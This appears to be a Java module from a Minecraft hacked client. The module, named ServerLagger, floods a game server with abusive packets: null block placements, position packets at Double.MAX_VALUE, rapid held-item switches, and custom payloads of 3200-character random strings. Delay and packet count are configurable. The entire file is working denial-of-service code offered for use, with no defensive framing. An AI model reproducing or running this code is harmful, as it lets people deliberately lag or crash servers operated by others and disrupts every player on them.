package wtf.bhopper.nonsense.module.impl.exploit;

import io.netty.util.internal.ThreadLocalRandom;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.network.PacketBuffer;
import net.minecraft.network.play.client.C03PacketPlayer;
import net.minecraft.network.play.client.C08PacketPlayerBlockPlacement;
import net.minecraft.network.play.client.C09PacketHeldItemChange;
import net.minecraft.network.play.client.C17PacketCustomPayload;
import net.minecraft.util.BlockPos;
import wtf.bhopper.nonsense.event.impl.EventJoinGame;
import wtf.bhopper.nonsense.event.impl.EventPreTick;
import wtf.bhopper.nonsense.module.Module;
import wtf.bhopper.nonsense.module.setting.impl.EnumSetting;
import wtf.bhopper.nonsense.module.setting.impl.IntSetting;
import wtf.bhopper.nonsense.util.misc.Clock;
import wtf.bhopper.nonsense.util.misc.GeneralUtil;
import wtf.bhopper.nonsense.util.minecraft.client.PacketUtil;

public class ServerLagger extends Module {

    private final EnumSetting<Mode> mode = new EnumSetting<>("Mode", "Mode", Mode.INTERACT);
    private final IntSetting delay = new IntSetting("Delay", "Delay between packet sends", 1, 5000, 100, "%dms", null);
    private final IntSetting amount = new IntSetting("Amount", "Amount of packets sent", 1, 1000, 5);

    private final Clock delayClock = new Clock();

    public ServerLagger() {
        super("Server Lagger", "Causes servers to lag", Category.EXPLOIT);
        this.addSettings(mode, delay, amount);
    }

    @EventHandler
    public void onTick(EventPreTick event) {
        if (!this.delayClock.hasReached(delay.get())) {
            return;
        }


        switch (this.mode.get()) {
            case INTERACT:
                for (int i = 0; i < this.amount.get(); i++) {
                    PacketUtil.send(new C08PacketPlayerBlockPlacement(BlockPos.ORIGIN, 0, null, 0.0F, 0.0F, 0.0F));
                }
                break;

            case POSITION:
                for (int i = 0; i < this.amount.get(); i++) {
                    PacketUtil.send(new C03PacketPlayer.C04PacketPlayerPosition(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE, false));
                }
                break;

            case SWITCH:
                int prevSlot = mc.thePlayer.inventory.currentItem;
                int slot = 0;
                for (int i = 0; i < this.amount.get(); i++) {
                    do {
                        slot = ThreadLocalRandom.current().nextInt(0, 9);
                    } while (slot == prevSlot);
                    PacketUtil.send(new C09PacketHeldItemChange(slot));
                    prevSlot = slot;
                }
                if (slot != mc.thePlayer.inventory.currentItem) {
                    PacketUtil.send(new C09PacketHeldItemChange(mc.thePlayer.inventory.currentItem));
                }
                break;

            case PAYLOAD:
                PacketBuffer buffer = PacketUtil.newBuffer();
                buffer.writeString(GeneralUtil.randomString(3200, true));
                for (int i = 0; i < this.amount.get(); i++) {
                    PacketUtil.send(new C17PacketCustomPayload(GeneralUtil.randomString(20, false), buffer));
                }
                break;
        }


        delayClock.reset();
    }

    @EventHandler
    public void onJoin(EventJoinGame event) {
        this.toggle(false);
    }

    @Override
    public String getSuffix() {
        return mode.getDisplayValue();
    }

    enum Mode {
        INTERACT,
        POSITION,
        SWITCH,
        PAYLOAD
    }

}
